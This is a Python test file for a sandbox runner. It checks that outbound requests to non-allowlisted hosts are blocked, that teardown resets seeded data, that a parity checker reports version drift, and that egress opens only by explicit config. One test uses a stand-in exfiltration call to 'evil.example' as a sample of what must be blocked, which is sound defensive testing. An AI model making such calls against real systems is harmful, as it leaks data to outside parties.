"""Tests for sandbox isolation: egress blocked, reset, parity."""

import pytest

from healing.sandbox.runner import (
    EgressBlocked,
    SandboxConfig,
    SandboxSession,
    check_parity,
)


def test_egress_blocked_for_real_systems() -> None:
    with SandboxSession() as sbx:
        with pytest.raises(EgressBlocked):
            sbx.http_get("https://api.real-vendor.example/v1/x")
        with pytest.raises(EgressBlocked):
            sbx.http_post("https://evil.example exfil", {})
        # Allowlist passes.
        assert sbx.http_get("http://demo:8001/login")
        assert sbx.wiremock.get("wiremock/products")


def test_teardown_resets_seeded_data() -> None:
    from demo_app.app import CART

    CART.append(99)
    with SandboxSession():
        pass
    assert CART == []
    assert "SANDBOX_ACTIVE" not in __import__("os").environ


def test_parity_reports_drift() -> None:
    ok = check_parity({"app": "1", "seed": "42"}, {"app": "1", "seed": "42"})
    assert ok.match and ok.drift == ()
    bad = check_parity({"app": "1"}, {"app": "2"})
    assert not bad.match and "app" in bad.drift


def test_egress_can_be_relaxed_only_by_config() -> None:
    cfg = SandboxConfig(egress_denied=False)
    with SandboxSession(cfg) as sbx:
        assert sbx.http_get("https://anything.example")  # explicitly allowed
